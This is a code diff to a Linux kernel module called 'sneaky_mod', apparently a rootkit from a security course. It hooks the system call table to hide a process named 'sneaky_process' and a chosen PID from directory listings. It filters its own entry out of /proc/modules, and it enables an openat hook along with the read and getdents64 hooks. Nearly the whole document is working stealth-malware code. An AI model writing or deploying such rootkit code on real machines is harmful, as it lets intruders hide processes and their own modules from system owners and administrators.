@@ -14,11 +14,22 @@
 #include <linux/file.h>
 #include <linux/dirent.h>
 
+#include <linux/ctype.h> // Include this at the top of your file
+bool is_number(const char *str) {
+  while (*str) {
+    if (!isdigit(*str))
+      return false;
+    str++;
+  }
+  return true;
+}
+
+static char *sneaky_pid = "";
+
+module_param(sneaky_pid, charp, 0000); // Declare a module parameter to accept the PID
+MODULE_PARM_DESC(sneaky_pid, "Process ID of the sneaky_process");
 
 #define PREFIX "sneaky_process"
-
-static char *pid = "";
-module_param(pid, charp, 0);
 
 // =========#2
 // struct linux_dirent64 {
@@ -34,11 +45,6 @@ struct linux_dirent {
   unsigned short d_reclen;
   char d_name[];
 };
-
-// =========#4
-static pid_t sneaky_pid = 0;
-module_param(sneaky_pid, int, 0);
-MODULE_PARM_DESC(sneaky_pid, "The process ID of the sneaky process");
 
 //This is a pointer to the system call table
 static unsigned long *sys_call_table;
@@ -98,7 +104,7 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
   nread = original_getdents64(regs);
   for(bpos=0; bpos < nread;){
     d = (struct linux_dirent64 *)((char *)regs->si + bpos);
-    if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, pid) == 0){
+    if (strcmp(d->d_name, "sneaky_process") == 0 || (is_number(d->d_name) && strcmp(d->d_name, sneaky_pid) == 0)){
       int current_size = d->d_reclen;
       int rest = ((char*)regs->si+nread) - ((char*)d+current_size);
       void* source = (char*)d + current_size;
@@ -112,53 +118,37 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
 
 // =========To hide the sneaky_module from the list of active kernel modules
 // declare a pointer to the original read system call
-asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
+asmlinkage ssize_t (*original_read)(struct pt_regs *regs);
 // create a sneaky_read function to intercept the read system call
-asmlinkage ssize_t sneaky_read(int fd, void *buf, size_t count) {
+asmlinkage ssize_t sneaky_read(struct pt_regs *regs) {
+  int fd = (int)regs->di;
+  void *buf = (void *)regs->si;
+  size_t count = (size_t)regs->dx;
+
+  struct file *f;
   ssize_t nread;
-  struct file *file;
-  char path_buf[64];
-  char *path;
-  char *start;
-  char *end;
 
-  nread = original_read(fd, buf, count);
-  if (nread <= 0) {
-    return nread;
+  nread = original_read(regs);
+
+  f = fget(fd);
+  if (f) {
+    if (nread > 0 && strcmp(f->f_path.dentry->d_iname, "modules") == 0) {
+      void *st = strnstr(buf, "sneaky_mod", nread);
+      if (st != NULL) {
+        void *ed = strnstr(st, "\n", nread - (st - buf));
+        if (ed != NULL) {
+          int len = ed - st + 1;
+          memmove(st, ed + 1, nread - (st - buf) - len);
+          nread -= len;
+        }
+      }
+    }
+    fput(f);
   }
-
-  file = fget(fd);
-  if (!file) {
-    return nread;
-  }
-
-  path = d_path(&file->f_path, path_buf, sizeof(path_buf));
-  fput(file);
-
-  if (IS_ERR(path)) {
-    return nread;
-  }
-
-  if (strcmp(path, "/proc/modules") != 0) {
-    return nread;
-  }
-
-  start = strstr(buf, "sneaky_mod");
-  if (!start) {
-    return nread;
-  }
-
-  end = strchr(start, '\n');
-  if (!end) {
-    return nread;
-  }
-
-  end++; // move past the newline character
-  memmove(start, end, nread - (end - (char *)buf));
-  nread -= (end - start);
 
   return nread;
 }
+
 
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
@@ -173,17 +163,17 @@ static int initialize_sneaky_module(void)
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
 
-  // // openat
-  // original_openat = (void *)sys_call_table[__NR_openat];
-  // sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
+  // openat
+  original_openat = (void *)sys_call_table[__NR_openat];
+  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
 
   // getdents64
   original_getdents64 = (void *)sys_call_table[__NR_getdents64];
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
 
-  // // read
-  // original_read = (void *)sys_call_table[__NR_read];
-  // sys_call_table[__NR_read] = (unsigned long)sneaky_read;
+  // // // read
+  original_read = (void *)sys_call_table[__NR_read];
+  sys_call_table[__NR_read] = (unsigned long)sneaky_read;
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
@@ -201,9 +191,9 @@ static void exit_sneaky_module(void)
   enable_page_rw((void *)sys_call_table);
 
  
-  //sys_call_table[__NR_openat] = (unsigned long)original_openat;
+  sys_call_table[__NR_openat] = (unsigned long)original_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
-  //sys_call_table[__NR_read] = (unsigned long)original_read;
+  sys_call_table[__NR_read] = (unsigned long)original_read;
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
